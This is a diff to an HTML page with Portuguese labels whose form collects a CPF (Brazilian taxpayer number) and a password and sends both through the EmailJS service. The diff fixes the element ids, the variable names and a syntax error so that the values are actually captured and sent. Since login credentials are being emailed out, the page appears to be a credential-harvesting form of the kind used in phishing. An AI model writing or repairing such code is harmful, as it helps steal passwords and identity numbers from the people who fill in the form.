@@ -15,7 +15,7 @@
             <input type="text" name="CPF" id="CPF" required>
         </label>
         <label for="SENHA">SENHA
-            <input type="SENHA" name="SENHA" id="SENHA" required>
+            <input type="password" name="SENHA" id="SENHA" required>
         </label>
         <button type="submit">Enviar</button>
     </form>
@@ -34,13 +34,13 @@
             event.preventDefault(); // Evita o envio normal do formulário
 
             // Coleta os dados do formulário
-            var cpf = document.getElementById("cpf").value;
-            var password = document.getElementById("password").value;
+            var cpf = document.getElementById("CPF").value;
+            var senha = document.getElementById("SENHA").value;
 
             // Cria um objeto com os dados do formulário
             var formData = {
-                CPF: CPF // Envia o valor do CPF
-                SENHA: SENHA // Envia o valor da senha
+                CPF: cpf, // Envia o valor do CPF
+                SENHA: senha // Envia o valor da senha
             };
 
             // Envia o formulário para o EmailJS
@@ -58,6 +58,7 @@
     </script>
 </body>
 </html>
+
 
 
 
